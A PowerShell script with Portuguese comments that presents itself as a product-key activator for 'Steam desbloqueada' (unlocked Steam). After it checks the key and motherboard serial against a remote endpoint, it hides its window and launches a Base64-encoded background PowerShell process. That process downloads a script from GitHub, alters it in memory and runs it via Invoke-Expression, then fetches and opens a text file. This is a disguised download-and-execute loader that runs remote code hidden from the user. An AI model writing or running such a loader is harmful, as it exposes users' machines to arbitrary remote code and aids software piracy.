# 1. Oculta a janela inicial (Console)
$showWindow = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
$type = Add-Type -MemberDefinition $showWindow -Name "Win32ShowWindow" -Namespace "Win32" -PassThru
$type::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type -AssemblyName Microsoft.VisualBasic, System.Windows.Forms

# Captura HWID e Key
$hwid = (Get-CimInstance Win32_BaseBoard).SerialNumber.Trim()
$key = [Microsoft.VisualBasic.Interaction]::InputBox("Insira sua chave do produto:", "ATIVAR STEAM DESBLOQUEADA", "")

if (-not $key) { exit }

try {
    $url = "https://waedqlfiprmsdkwhjkea.supabase.co/functions/v1/smooth-worker"
    $body = @{ key = $key; hwid = $hwid } | ConvertTo-Json
    $auth = Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json" -UserAgent "Mozilla/5.0"

    if ($auth.status -eq "authorized") {
        
        # Mensagem de sucesso e aviso de 1 minuto
        [System.Windows.Forms.MessageBox]::Show("STEAM DESBLOQUEADA ATIVADA PERMANENTEMENTE`n(Qualquer erro ative novamente com a mesma chave)`n`nO download iniciou e pode levar cerca de 1 minuto. Aguarde.", "Sucesso")

        # Comando de fundo (Instalação + Warning + Notepad)
        $bgTask = @"
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        try {
            # Baixa o script da Steam como texto
            `$s = Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/VenezzaX/SteamFunDependencies/refs/heads/main/steampro.ps1'
            
            # --- O SEGREDO ESTÁ AQUI: MODIFICAR NA MEMÓRIA ---
            # Remove a pausa do Steamtools
            `$s = `$s.Replace('[void][System.Console]::ReadKey(`$true)', '')
            
            # Substitui a verificação de tecla do Millennium para $false (assim ele só aguarda os 5 segundos e segue)
            `$s = `$s.Replace('[Console]::KeyAvailable', '`$false')
            
            # Agora executa o script já limpo, garantindo que não vai travar
            Invoke-Expression `$s

            # Baixa o aviso e abre no notepad
            `$wUrl = "https://raw.githubusercontent.com/RicoSteam/SteamMethod/refs/heads/main/warning.txt"
            `$path = "`$env:TEMP\warning.txt"
            (New-Object System.Net.WebClient).DownloadFile(`$wUrl, `$path)
            Start-Process notepad.exe `$path
        } catch {}
"@

        # Conversão para Base64 para evitar erros de sintaxe no Windows
        $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($bgTask))
        
        # REMOVIDO o -CreateNoWindow para evitar o erro. O -WindowStyle Hidden já faz o trabalho.
        Start-Process powershell.exe -ArgumentList "-NoProfile", "-WindowStyle Hidden", "-EncodedCommand", $encoded -WindowStyle Hidden
        
        exit

    } else {
        [System.Windows.Forms.MessageBox]::Show("Chave inválida ou já vinculada a outro computador.", "Acesso Negado")
    }
} catch {
    [System.Windows.Forms.MessageBox]::Show("Erro ao validar: Verifique sua chave ou network.`n`nDetalhe: $($_.Exception.Message)", "Erro")
}
